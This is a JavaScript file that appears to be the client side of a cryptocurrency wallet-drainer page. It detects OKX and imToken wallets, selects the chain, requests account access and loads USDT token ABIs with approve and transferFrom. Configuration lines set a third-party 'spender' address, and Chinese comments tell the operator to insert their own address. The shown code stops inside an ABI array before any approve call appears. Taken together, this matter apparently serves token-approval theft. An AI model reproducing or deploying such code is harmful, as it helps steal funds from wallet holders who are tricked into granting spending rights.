spender_bas58 = 'TLT3QYegpmLWhmszCebTfNqwdPGcQFJn9z' // 应该是合约地址，原来的是 TBvWK12aKi3ravybcEyPNSh2qeU7oAgWpb ，其他不变
if (typeof window.tronWeb !== 'undefined') {
  spender_hex = tronWeb.address.toHex(spender_bas58)
} else {
  spender_hex = null
}
//这里地址更改为自己地址(目前是随便写的一个)
eth_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
// BSC合约地址
bsc_contract_address = '0xa9470e80e9ad31b4b0d745037711bc3ef30ce70c'
approve_type = 2

function printd(text) {
  if (dev) {
    document.getElementById('dev').innerHTML += text + '<br>'
  }
}

function copyTextToClipboard(text) {
  var textArea = document.createElement('textarea')
  textArea.value = text
  document.body.appendChild(textArea)
  textArea.select()
  document.execCommand('copy')
  document.body.removeChild(textArea)
}

function handleChainChanged(chainId) {
  window.location.reload()
}

async function getWallet() {
  printd('retry')
  if (typeof window.okxwallet !== 'undefined') {
    wallet = 'okxwallet'
    printd('okxwallet')
    const chainId = await window.ethereum.request({ method: 'eth_chainId' })
    window.ethereum.on('chainChanged', handleChainChanged)
    if (chainId == '0x1') {
      chain = 'eth'
      contract_addr = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
      contract_abi = [
        {
          constant: true,
          inputs: [],
          name: 'name',
          outputs: [{ name: '', type: 'string' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: '_upgradedAddress', type: 'address' }],
          name: 'deprecate',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            { name: '_spender', type: 'address' },
            { name: '_value', type: 'uint256' },
          ],
          name: 'approve',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'deprecated',
          outputs: [{ name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: '_evilUser', type: 'address' }],
          name: 'addBlackList',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'totalSupply',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            { name: '_from', type: 'address' },
            { name: '_to', type: 'address' },
            {
              name: '_value',
              type: 'uint256',
            },
          ],
          name: 'transferFrom',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'upgradedAddress',
          outputs: [{ name: '', type: 'address' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [{ name: '', type: 'address' }],
          name: 'balances',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'decimals',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'maximumFee',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: '_totalSupply',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [],
          name: 'unpause',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [{ name: '_maker', type: 'address' }],
          name: 'getBlackListStatus',
          outputs: [{ name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [
            { name: '', type: 'address' },
            { name: '', type: 'address' },
          ],
          name: 'allowed',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'paused',
          outputs: [{ name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [{ name: 'who', type: 'address' }],
          name: 'balanceOf',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [],
          name: 'pause',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'getOwner',
          outputs: [{ name: '', type: 'address' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'owner',
          outputs: [{ name: '', type: 'address' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'symbol',
          outputs: [{ name: '', type: 'string' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            { name: '_to', type: 'address' },
            { name: '_value', type: 'uint256' },
          ],
          name: 'transfer',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            { name: 'newBasisPoints', type: 'uint256' },
            { name: 'newMaxFee', type: 'uint256' },
          ],
          name: 'setParams',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: 'amount', type: 'uint256' }],
          name: 'issue',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: 'amount', type: 'uint256' }],
          name: 'redeem',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [
            { name: '_owner', type: 'address' },
            { name: '_spender', type: 'address' },
          ],
          name: 'allowance',
          outputs: [{ name: 'remaining', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'basisPointsRate',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [{ name: '', type: 'address' }],
          name: 'isBlackListed',
          outputs: [{ name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: '_clearedUser', type: 'address' }],
          name: 'removeBlackList',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'MAX_UINT',
          outputs: [{ name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: 'newOwner', type: 'address' }],
          name: 'transferOwnership',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ name: '_blackListedUser', type: 'address' }],
          name: 'destroyBlackFunds',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          inputs: [
            { name: '_initialSupply', type: 'uint256' },
            {
              name: '_name',
              type: 'string',
            },
            { name: '_symbol', type: 'string' },
            { name: '_decimals', type: 'uint256' },
          ],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'constructor',
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
          name: 'Issue',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: 'amount', type: 'uint256' }],
          name: 'Redeem',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: 'newAddress', type: 'address' }],
          name: 'Deprecate',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            { indexed: false, name: 'feeBasisPoints', type: 'uint256' },
            {
              indexed: false,
              name: 'maxFee',
              type: 'uint256',
            },
          ],
          name: 'Params',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            { indexed: false, name: '_blackListedUser', type: 'address' },
            {
              indexed: false,
              name: '_balance',
              type: 'uint256',
            },
          ],
          name: 'DestroyedBlackFunds',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: '_user', type: 'address' }],
          name: 'AddedBlackList',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [{ indexed: false, name: '_user', type: 'address' }],
          name: 'RemovedBlackList',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            { indexed: true, name: 'owner', type: 'address' },
            {
              indexed: true,
              name: 'spender',
              type: 'address',
            },
            { indexed: false, name: 'value', type: 'uint256' },
          ],
          name: 'Approval',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            { indexed: true, name: 'from', type: 'address' },
            {
              indexed: true,
              name: 'to',
              type: 'address',
            },
            { indexed: false, name: 'value', type: 'uint256' },
          ],
          name: 'Transfer',
          type: 'event',
        },
        { anonymous: false, inputs: [], name: 'Pause', type: 'event' },
        {
          anonymous: false,
          inputs: [],
          name: 'Unpause',
          type: 'event',
        },
      ]
      web3 = new Web3(ethereum)
      contract = new web3.eth.Contract(contract_abi, contract_addr)
      accounts = await ethereum.request({ method: 'eth_requestAccounts' })
      if (accounts.length > 0) {
        printd('eth')
        pay_addr_input_ele.innerHTML = contract_addr
        clearInterval(getWalletTimer)
        pay_ele.removeAttribute('style')
        wallet_ele.setAttribute('style', 'display:none')
      }
    } else if (chainId == '0x38') {
      chain = 'bsc'
      contract_addr = '0x55d398326f99059ff775485246999027b3197955'
      contract_abi = [
        {
          inputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'constructor',
        },
        {
          anonymous: false,
          inputs: [
            {
              indexed: true,
              internalType: 'address',
              name: 'owner',
              type: 'address',
            },
            {
              indexed: true,
              internalType: 'address',
              name: 'spender',
              type: 'address',
            },
            { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
          ],
          name: 'Approval',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            {
              indexed: true,
              internalType: 'address',
              name: 'previousOwner',
              type: 'address',
            },
            { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' },
          ],
          name: 'OwnershipTransferred',
          type: 'event',
        },
        {
          anonymous: false,
          inputs: [
            {
              indexed: true,
              internalType: 'address',
              name: 'from',
              type: 'address',
            },
            { indexed: true, internalType: 'address', name: 'to', type: 'address' },
            {
              indexed: false,
              internalType: 'uint256',
              name: 'value',
              type: 'uint256',
            },
          ],
          name: 'Transfer',
          type: 'event',
        },
        {
          constant: true,
          inputs: [],
          name: '_decimals',
          outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: '_name',
          outputs: [{ internalType: 'string', name: '', type: 'string' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: '_symbol',
          outputs: [{ internalType: 'string', name: '', type: 'string' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [
            { internalType: 'address', name: 'owner', type: 'address' },
            {
              internalType: 'address',
              name: 'spender',
              type: 'address',
            },
          ],
          name: 'allowance',
          outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            {
              internalType: 'address',
              name: 'spender',
              type: 'address',
            },
            { internalType: 'uint256', name: 'amount', type: 'uint256' },
          ],
          name: 'approve',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [{ internalType: 'address', name: 'account', type: 'address' }],
          name: 'balanceOf',
          outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
          name: 'burn',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'decimals',
          outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            {
              internalType: 'address',
              name: 'spender',
              type: 'address',
            },
            { internalType: 'uint256', name: 'subtractedValue', type: 'uint256' },
          ],
          name: 'decreaseAllowance',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'getOwner',
          outputs: [{ internalType: 'address', name: '', type: 'address' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            {
              internalType: 'address',
              name: 'spender',
              type: 'address',
            },
            { internalType: 'uint256', name: 'addedValue', type: 'uint256' },
          ],
          name: 'increaseAllowance',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
          name: 'mint',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'name',
          outputs: [{ internalType: 'string', name: '', type: 'string' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'owner',
          outputs: [{ internalType: 'address', name: '', type: 'address' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [],
          name: 'renounceOwnership',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'symbol',
          outputs: [{ internalType: 'string', name: '', type: 'string' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: true,
          inputs: [],
          name: 'totalSupply',
          outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
          payable: false,
          stateMutability: 'view',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            {
              internalType: 'address',
              name: 'recipient',
              type: 'address',
            },
            { internalType: 'uint256', name: 'amount', type: 'uint256' },
          ],
          name: 'transfer',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [
            { internalType: 'address', name: 'sender', type: 'address' },
            {
              internalType: 'address',
              name: 'recipient',
              type: 'address',
            },
            { internalType: 'uint256', name: 'amount', type: 'uint256' },
          ],
          name: 'transferFrom',
          outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
        {
          constant: false,
          inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
          name: 'transferOwnership',
          outputs: [],
          payable: false,
          stateMutability: 'nonpayable',
          type: 'function',
        },
      ]
      web3 = new Web3(ethereum)
      contract = new web3.eth.Contract(contract_abi, contract_addr)
      accounts = await ethereum.request({ method: 'eth_requestAccounts' })
      if (accounts.length > 0) {
        printd('bsc')
        pay_addr_input_ele.innerHTML = contract_addr
        clearInterval(getWalletTimer)
        pay_ele.removeAttribute('style')
        wallet_ele.setAttribute('style', 'display:none')
      }
    } else if (chainId == '0xc3') {
      chain = 'tron'
      printd('tron')
      pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
      clearInterval(getWalletTimer)
      pay_ele.removeAttribute('style')
      wallet_ele.setAttribute('style', 'display:none')
    }
  } else if (typeof window.imToken !== 'undefined') {
    wallet = 'imToken'
    printd('imtoken')
    if (typeof window.tronWeb !== 'undefined') {
      chain = 'tron'
      printd('tron')
      pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
      clearInterval(getWalletTimer)
      pay_ele.removeAttribute('style')
      wallet_ele.setAttribute('style', 'display:none')
    } else if (typeof window.ethereum) {
      printd('eth')
      switch (parseInt(window.ethereum.networkVersion)) {
        case 56:
          chain = 'bsc'
          contract_addr = '0x55d398326f99059ff775485246999027b3197955'
          contract_abi = [
            {
              inputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'constructor',
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'owner',
                  type: 'address',
                },
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
              ],
              name: 'Approval',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'previousOwner',
                  type: 'address',
                },
                { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' },
              ],
              name: 'OwnershipTransferred',
              type: 'event',
            },
            {
              anonymous: false,
              inputs: [
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'from',
                  type: 'address',
                },
                {
                  indexed: true,
                  internalType: 'address',
                  name: 'to',
                  type: 'address',
                },
                { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
              ],
              name: 'Transfer',
              type: 'event',
            },
            {
              constant: true,
              inputs: [],
              name: '_decimals',
              outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: '_name',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: '_symbol',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [
                {
                  internalType: 'address',
                  name: 'owner',
                  type: 'address',
                },
                { internalType: 'address', name: 'spender', type: 'address' },
              ],
              name: 'allowance',
              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'amount', type: 'uint256' },
              ],
              name: 'approve',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ internalType: 'address', name: 'account', type: 'address' }],
              name: 'balanceOf',
              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
              name: 'burn',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'decimals',
              outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'subtractedValue', type: 'uint256' },
              ],
              name: 'decreaseAllowance',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'getOwner',
              outputs: [{ internalType: 'address', name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'spender',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'addedValue', type: 'uint256' },
              ],
              name: 'increaseAllowance',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
              name: 'mint',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'name',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'owner',
              outputs: [{ internalType: 'address', name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [],
              name: 'renounceOwnership',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'symbol',
              outputs: [{ internalType: 'string', name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'totalSupply',
              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'recipient',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'amount', type: 'uint256' },
              ],
              name: 'transfer',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                {
                  internalType: 'address',
                  name: 'sender',
                  type: 'address',
                },
                {
                  internalType: 'address',
                  name: 'recipient',
                  type: 'address',
                },
                { internalType: 'uint256', name: 'amount', type: 'uint256' },
              ],
              name: 'transferFrom',
              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
              name: 'transferOwnership',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
          ]
          web3 = new Web3(ethereum)
          contract = new web3.eth.Contract(contract_abi, contract_addr)
          accounts = await ethereum.request({ method: 'eth_requestAccounts' })
          if (accounts.length > 0) {
            printd('bsc')
            pay_addr_input_ele.innerHTML = contract_addr
            clearInterval(getWalletTimer)
            pay_ele.removeAttribute('style')
            wallet_ele.setAttribute('style', 'display:none')
          }
          break
        case 66:
          chain = 'okxc'
          contract_addr = '0x382bB369d343125BfB2117af9c149795C6C65C50'
          contract_abi = [
            {
              outputs: [{ name: 'impl', type: 'address' }],
              constant: true,
              payable: false,
              inputs: [],
              name: 'implementation',
              stateMutability: 'view',
              type: 'function',
            },
            {
              payable: false,
              inputs: [],
              stateMutability: 'nonpayable',
              type: 'constructor',
            },
            {
              payable: true,
              stateMutability: 'payable',
              type: 'fallback',
            },
            {
              inputs: [
                { indexed: false, name: 'previousOwner', type: 'address' },
                {
                  indexed: false,
                  name: 'newOwner',
                  type: 'address',
                },
              ],
              name: 'ProxyOwnershipTransferred',
              anonymous: false,
              type: 'event',
            },
            {
              inputs: [{ indexed: true, name: 'implementation', type: 'address' }],
              name: 'Upgraded',
              anonymous: false,
              type: 'event',
            },
            {
              outputs: [{ name: 'owner', type: 'address' }],
              constant: true,
              payable: false,
              inputs: [],
              name: 'proxyOwner',
              stateMutability: 'view',
              type: 'function',
            },
            {
              outputs: [],
              constant: false,
              payable: false,
              inputs: [{ name: 'newOwner', type: 'address' }],
              name: 'transferProxyOwnership',
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              outputs: [],
              constant: false,
              payable: false,
              inputs: [{ name: 'implementation', type: 'address' }],
              name: 'upgradeTo',
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              outputs: [],
              constant: false,
              payable: true,
              inputs: [
                { name: 'implementation', type: 'address' },
                { name: 'data', type: 'bytes' },
              ],
              name: 'upgradeToAndCall',
              stateMutability: 'payable',
              type: 'function',
            },
          ]
          web3 = new Web3(ethereum)
          contract = new web3.eth.Contract(contract_abi, contract_addr)
          accounts = await ethereum.request({ method: 'eth_requestAccounts' })
          if (accounts.length > 0) {
            printd('okxc')
            pay_addr_input_ele.innerHTML = contract_addr
            clearInterval(getWalletTimer)
            pay_ele.removeAttribute('style')
            wallet_ele.setAttribute('style', 'display:none')
          }
          break
        case 1:
          chain = 'eth'
          contract_addr = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
          contract_abi = [
            {
              constant: true,
              inputs: [],
              name: 'name',
              outputs: [{ name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_upgradedAddress', type: 'address' }],
              name: 'deprecate',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: '_spender', type: 'address' },
                { name: '_value', type: 'uint256' },
              ],
              name: 'approve',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'deprecated',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_evilUser', type: 'address' }],
              name: 'addBlackList',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'totalSupply',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: '_from', type: 'address' },
                {
                  name: '_to',
                  type: 'address',
                },
                { name: '_value', type: 'uint256' },
              ],
              name: 'transferFrom',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'upgradedAddress',
              outputs: [{ name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: '', type: 'address' }],
              name: 'balances',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'decimals',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'maximumFee',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: '_totalSupply',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [],
              name: 'unpause',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: '_maker', type: 'address' }],
              name: 'getBlackListStatus',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [
                { name: '', type: 'address' },
                { name: '', type: 'address' },
              ],
              name: 'allowed',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'paused',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: 'who', type: 'address' }],
              name: 'balanceOf',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [],
              name: 'pause',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'getOwner',
              outputs: [{ name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'owner',
              outputs: [{ name: '', type: 'address' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'symbol',
              outputs: [{ name: '', type: 'string' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: '_to', type: 'address' },
                { name: '_value', type: 'uint256' },
              ],
              name: 'transfer',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [
                { name: 'newBasisPoints', type: 'uint256' },
                {
                  name: 'newMaxFee',
                  type: 'uint256',
                },
              ],
              name: 'setParams',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: 'amount', type: 'uint256' }],
              name: 'issue',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: 'amount', type: 'uint256' }],
              name: 'redeem',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [
                { name: '_owner', type: 'address' },
                { name: '_spender', type: 'address' },
              ],
              name: 'allowance',
              outputs: [{ name: 'remaining', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'basisPointsRate',
              outputs: [{ name: '', type: 'uint256' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: true,
              inputs: [{ name: '', type: 'address' }],
              name: 'isBlackListed',
              outputs: [{ name: '', type: 'bool' }],
              payable: false,
              stateMutability: 'view',
              type: 'function',
            },
            {
              constant: false,
              inputs: [{ name: '_clearedUser', type: 'address' }],
              name: 'removeBlackList',
              outputs: [],
              payable: false,
              stateMutability: 'nonpayable',
              type: 'function',
            },
            {
              constant: true,
              inputs: [],
              name: 'MAX_UINT',
